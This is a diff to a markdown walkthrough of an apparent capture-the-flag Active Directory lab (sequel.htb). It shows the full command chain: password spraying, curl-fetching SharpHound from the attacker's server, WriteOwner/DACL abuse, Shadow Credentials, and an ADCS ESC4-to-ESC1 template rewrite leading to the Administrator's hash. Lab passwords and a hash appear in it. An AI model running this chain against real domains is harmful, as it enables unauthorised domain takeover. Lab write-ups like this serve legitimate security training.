@@ -73,8 +73,6 @@ Since we don't know who this belongs to, we perform a Password Spraying attack a
 
 <img width="570" height="478" alt="image" src="https://github.com/user-attachments/assets/7bd45e0f-a587-473d-9f1d-130ee97a31a6" />
 
-siamo riusciti a trovare una la password di sql_svc. ora quello che mi viene da pensare è fare password spraying con gli users che abbiamo trovato enumerando smb
-
 `nxc smb 10.129.232.128 -u final.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success`
 
 <img width="1431" height="191" alt="image" src="https://github.com/user-attachments/assets/bb312eca-db6c-4683-8cc3-990ec1d7149d" />
@@ -83,38 +81,58 @@ Ok, Ryan is a valid Domanio user with the password we found, now let's see what 
 
 <img width="1898" height="191" alt="image" src="https://github.com/user-attachments/assets/f115e530-7b34-4e92-88f6-e550a650887a" />
 
-OK, the next step is to map the domain using Bloodhound, so let's load Bloodhound into the shell
+We get a hit! The password belongs to the domain user ryan.
 
+To understand Ryan's role in the domain and map out potential attack paths, we need to run BloodHound. We transfer SharpHound.exe to the target machine via our Python HTTP server and execute it to collect Active Directory data natively:
 
 `curl http://10.10.14.142:8000/SharpHound.exe -o sh.exe`
 
 <img width="1226" height="391" alt="image" src="https://github.com/user-attachments/assets/5ac33eab-14b9-4613-a70e-5d69cf0528c4" />
 
-Before taking control of CS_SVC, let's see if we can find any vulnerable certificates.
+## 5. Privilege Escalation via ADCS (ESC4 to ESC1)
+While BloodHound is analyzing the data, we also check for Active Directory Certificate Services (ADCS) vulnerabilities using certipy-ad:
 
 `certipy-ad find -u rose@sequel.htb -p  'KxEPkKe6R8su' -stdout`
 
 <img width="724" height="284" alt="image" src="https://github.com/user-attachments/assets/61eda8ec-c9e2-4425-a792-e387e9660e35" />
 
-We find 33 certificates, but we see that users in the CERT PUBLISHER group have control over the certificate templates. Therefore, they can modify them, making them vulnerable. Our user Ryan has WriteOwner permissions (can overwrite the owner) on the CA_SVC account.
+### The Attack Path (ESC4)
+By correlating the BloodHound graph and the Certipy output, we identify a clear path to Domain Admin:
+Our compromised user ryan has the WriteOwner permission over the CA_SVC account.
 The CA_SVC account is a member of the Cert Publishers group.
-As we saw earlier with Certify, the Cert Publishers group controls the certificate templates.
-BloodHound directly labels the last step with an arc named ADCS ESC4 pointing to the domain.
+The Cert Publishers group has Full Control over the certificate templates, allowing them to modify templates and make them vulnerable (an attack known as ESC4).
+
+### Step 1: Taking Ownership and Modifying DACL
+
+First, we use Impacket's owneredit.py to exploit the WriteOwner privilege and make ryan the owner of ca_svc
 
 `owneredit.py -action write -new-owner ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'`
+
 <img width="925" height="151" alt="image" src="https://github.com/user-attachments/assets/81ee873c-64a1-4819-a8af-4125e299aee2" />
+
+Now that Ryan is the owner, he has the right to modify the Access Control List (DACL). We use dacledit.py to grant Ryan FullControl over the ca_svc account:
 
 `dacledit.py -action write -rights FullControl -principal ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'`
 
 <img width="936" height="108" alt="image" src="https://github.com/user-attachments/assets/a451c8f9-60fe-45f5-a5d8-03d6c19b2a28" />
 
+### Step 2: Shadow Credentials Attack
+
+With Full Control, we can perform a Shadow Credentials attack to inject a Key Credential Link into ca_svc and retrieve its NTLM hash:
+
 `certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 `
 
 <img width="940" height="396" alt="image" src="https://github.com/user-attachments/assets/075dfa25-149e-4e7b-99a6-af280cdacea6" />
 
+We verify the extracted hash 3b181b914e7a9d5508ea1e20bc2b7fce using NetExec to confirm we now have access as ca_svc:
+
 `nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce`
 
 <img width="937" height="79" alt="image" src="https://github.com/user-attachments/assets/fd216993-e3cc-4a20-9e26-554ca22fd1a8" />
+
+### Step 3: Modifying the Template (ESC4)
+
+Now acting as ca_svc (a member of Cert Publishers), we rewrite the configuration of the DunderMifflinAuthentication template. We use -write-default-configuration to intentionally introduce an ESC1 vulnerability, allowing any user to request a certificate on behalf of anyone else. We also save the old config for OPSEC purposes.
 
 `certipy-ad template \
   -u ca_svc@sequel.htb \
@@ -126,6 +144,9 @@ BloodHound directly labels the last step with an arc named ADCS ESC4 pointing to
 
 <img width="940" height="281" alt="image" src="https://github.com/user-attachments/assets/2e541235-2c77-45e3-82f4-a280ff502fc4" />
 
+### Step 4: Requesting Admin Certificate and Extracting Hash (ESC1)
+
+With the template now vulnerable, we request a certificate explicitly specifying the Domain Administrator as the User Principal Name (UPN):
 
 `certipy-ad req \
   -u ca_svc@sequel.htb \
@@ -138,6 +159,7 @@ BloodHound directly labels the last step with an arc named ADCS ESC4 pointing to
 
   <img width="713" height="281" alt="image" src="https://github.com/user-attachments/assets/8ca41e5c-14be-47d4-9853-225a3dcfb58d" />
 
+Finally, we use the obtained administrator.pfx certificate to authenticate via PKINIT to the Domain Controller. This process decrypts and retrieves the NTLM hash of the Administrator, completing the full compromise of the domain.
 
 `certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128`
 
